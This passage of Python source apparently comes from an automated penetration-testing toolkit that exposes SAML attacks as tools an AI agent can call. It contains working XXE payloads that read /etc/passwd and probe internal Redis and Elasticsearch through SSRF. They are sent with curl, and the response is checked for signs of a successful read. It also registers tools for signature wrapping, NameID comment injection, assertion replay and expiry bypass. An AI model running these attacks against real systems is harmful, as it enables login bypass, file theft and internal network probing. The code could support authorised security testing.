  <!ENTITY xxe SYSTEM "http://127.0.0.1:6379">
]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
  xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_r1" Version="2.0"
  IssueInstant="2024-01-01T00:00:00Z">
  <saml:Issuer>&xxe;</saml:Issuer>
</samlp:Response>"""),
        ("xxe_ssrf_elasticsearch_9200", f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE samlp:Response [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:9200">
]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
  xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_r1" Version="2.0"
  IssueInstant="2024-01-01T00:00:00Z">
  <saml:Issuer>&xxe;</saml:Issuer>
</samlp:Response>"""),
        ("xxe_saml_request_get", None),  # Marker for GET-based SAMLRequest test
    ]

    results: list[dict[str, Any]] = []
    interesting_responses: list[str] = []

    for endpoint in saml_endpoints:
        url = f"{base}{endpoint}"

        for payload_name, xml_payload in payloads:
            if xml_payload is None:
                # Test XXE via SAMLRequest GET parameter
                xxe_xml = XXE_TEMPLATE_FILE
                b64 = _b64_encode_xml(xxe_xml)
                get_url = f"{url}?SAMLRequest={urllib.parse.quote(b64)}"
                result = run_cmd(
                    ["curl", "-s", "-i", "--max-time", "10", get_url],
                    timeout=14,
                )
            else:
                encoded = _b64_encode_xml(xml_payload)
                post_data = f"SAMLResponse={urllib.parse.quote(encoded)}&RelayState=/"
                result = run_cmd(
                    ["curl", "-s", "-i", "-X", "POST", "-d", post_data,
                     "-H", "Content-Type: application/x-www-form-urlencoded",
                     "--max-time", "10", url],
                    timeout=14,
                )

            out = result.get("stdout", "")
            code_match = re.search(r"^HTTP/[\d.]+ (\d+)", out, re.MULTILINE)
            code = code_match.group(1) if code_match else "000"
            lower_out = out.lower()

            # Detect XXE success indicators
            xxe_indicators: list[str] = []
            if "root:" in out or "/bin/bash" in out or "/usr/sbin" in out:
                xxe_indicators.append("FILE READ - /etc/passwd content in response")
            if "redis" in lower_out or "+pong" in out:
                xxe_indicators.append("SSRF hit Redis service")
            if '"name" : "elasticsearch"' in lower_out or '"cluster_name"' in lower_out:
                xxe_indicators.append("SSRF hit Elasticsearch")
            if code in ("500", "503") and "xml" in lower_out:
                xxe_indicators.append(f"XML parsing error (HTTP {code}) - possible DTD processing")
            if code not in ("404",) and xml_payload and "DOCTYPE" in xml_payload:
                if code not in ("400",):
                    xxe_indicators.append(f"DTD not rejected outright (HTTP {code})")

            if xxe_indicators:
                entry = f"  [+] {endpoint} | {payload_name}: {', '.join(xxe_indicators)}"
                lines.append(entry)
                interesting_responses.append(entry)
            else:
                lines.append(f"  [-] {endpoint} | {payload_name}: HTTP {code}")

            results.append({
                "endpoint": endpoint,
                "payload": payload_name,
                "http_code": code,
                "indicators": xxe_indicators,
            })

    if interesting_responses:
        lines.append(f"\n  POTENTIAL XXE FINDINGS ({len(interesting_responses)}):")
        for r in interesting_responses:
            lines.append(f"    {r}")
        lines.append(f"\n  NOTE: For blind XXE replace callback_host with live Burp Collaborator/interactsh")
    else:
        lines.append("\n  No obvious XXE indicators. Check collaborator for out-of-band callbacks.")

    return {
        "stdout": _cap("\n".join(lines)),
        "stderr": "",
        "returncode": 0,
        "parsed": {
            "interesting_count": len(interesting_responses),
            "results": results,
            "callback_host_used": callback_host,
        },
    }


# ---------------------------------------------------------------------------
# Tool registration
# ---------------------------------------------------------------------------


def register_saml_tools(config: Config) -> list[Tool]:
    """Register all SAML attack tools."""
    tools: list[Tool] = []

    tools.append(Tool(
        name="saml_detect",
        description=(
            "Detect SAML SSO endpoints on a target. Probes 20+ common SAML paths "
            "including /saml/login, /saml/acs, /saml/metadata, /adfs/ls, "
            "/FederationMetadata/2007-06/FederationMetadata.xml, and similar. "
            "Checks responses for SAMLRequest, SAMLResponse, RelayState parameters, "
            "SAML namespace XML, and SSO redirect chains. Use this as the first SAML "
            "tool whenever a target may use enterprise SSO, Okta, ADFS, OneLogin, "
            "PingFederate, Shibboleth, or any federated identity provider."
        ),
        parameters={
            "target": "Target URL or domain to scan (e.g. https://app.example.com or app.example.com)",
        },
        example='{"target": "https://app.example.com"}',
        phase_tags=["discovery", "vulnerability_scan"],
        execute=saml_detect,
    ))

    tools.append(Tool(
        name="saml_signature_test",
        description=(
            "Generate and submit XML Signature Wrapping (XSW) attack variants against a SAML SP. "
            "Tests 8 XSW variants (evil assertion before/after/wrapping the signed one), "
            "signature element removal, empty and zeroed SignatureValue, duplicate Assertion "
            "with evil first, and response-level-only signature with unsigned evil assertion. "
            "Each payload is base64-encoded and submitted to the ACS endpoint. An HTTP 200/302 "
            "without an error page indicates signature validation bypass. Provide a captured "
            "SAMLResponse for realistic payloads; works without one using synthetic XML. "
            "Use after saml_detect confirms /saml/acs or equivalent."
        ),
        parameters={
            "target": "Target base URL of the SAML SP (e.g. https://app.example.com)",
            "saml_response": "Base64-encoded SAMLResponse captured from a valid login (optional but recommended)",
        },
        example='{"target": "https://app.example.com", "saml_response": "PHNhbWxwOlJlc3BvbnNlIHhtbG5z..."}',
        phase_tags=["exploitation", "vulnerability_scan"],
        execute=saml_signature_test,
    ))

    tools.append(Tool(
        name="saml_void_canonicalization",
        description=(
            "Test 2025 Void Canonicalization and XML-level SAML assertion manipulation. "
            "Sends comment-injected NameIDs (admin<!---->\u0040victim.com), duplicate XML "
            "attributes to confuse parsers, namespace redefinition to reroute assertion "
            "elements, Unicode fullwidth/lookalike character normalization attacks on NameID. "
            "These target the gap between the signature validator's canonicalized view and "
            "the application's raw XML parsing. Critical for testing identity provider "
            "implementations that perform post-validation NameID processing. Use when "
            "standard XSW fails but the SP processes assertions after signature validation."
        ),
        parameters={
            "target": "Target base URL of the SAML SP",
            "saml_response": "Base64-encoded SAMLResponse from a valid session (optional)",
        },
        example='{"target": "https://app.example.com"}',
        phase_tags=["exploitation", "vulnerability_scan"],
        execute=saml_void_canonicalization,
    ))

    tools.append(Tool(
        name="saml_assertion_attacks",
        description=(
            "Test SAML assertion-level manipulation: replay, audience bypass, time extension, "
            "InResponseTo removal, and Recipient manipulation. Assertion replay resubmits a "
            "captured assertion to check for replay protection. Audience restriction removal "
            "and wildcard tests check if the SP enforces its own entityID. Time window "
            "extension sets NotBefore=2000 and NotOnOrAfter=2099 to bypass expiry checks. "
            "InResponseTo removal converts SP-initiated flow to IdP-initiated (drops CSRF "
            "binding). Recipient URL changes and removal test whether the SP validates the "
            "assertion destination. Requires a captured SAMLResponse for realistic tests; "
            "falls back to synthetic assertions if none provided."
        ),
        parameters={
            "target": "Target base URL of the SAML SP",
            "saml_response": "Base64-encoded SAMLResponse from a valid login (optional but strongly recommended)",
        },
        example='{"target": "https://app.example.com", "saml_response": "PHNhbWxwOlJlc3BvbnNlIHhtbG5z..."}',
        phase_tags=["exploitation", "vulnerability_scan"],
        execute=saml_assertion_attacks,
    ))

    tools.append(Tool(
        name="saml_xxe_test",
        description=(
            "Test for XXE (XML External Entity) injection via SAML XML parsing. "
            "Injects DTD declarations into SAMLResponse POST bodies and SAMLRequest GET "
            "parameters across all detected SAML endpoints. Tests file:///etc/passwd read, "
            "HTTP SSRF callback (blind XXE detection), parameter entity chain for exfiltration, "
            "and SSRF probes against localhost:22 (SSH), :6379 (Redis), :9200 (Elasticsearch). "
            "A root: in response body confirms file read. A 500 with XML error suggests DTD "
            "processing is enabled. Replace the callback_host in results with a live "
            "Burp Collaborator or interactsh host for blind out-of-band detection. "
            "Use after saml_detect finds SAML endpoints."
        ),
        parameters={
            "target": "Target base URL to test XXE against all SAML endpoints",
        },
        example='{"target": "https://app.example.com"}',
        phase_tags=["exploitation", "vulnerability_scan"],
        execute=saml_xxe_test,
    ))

    return tools
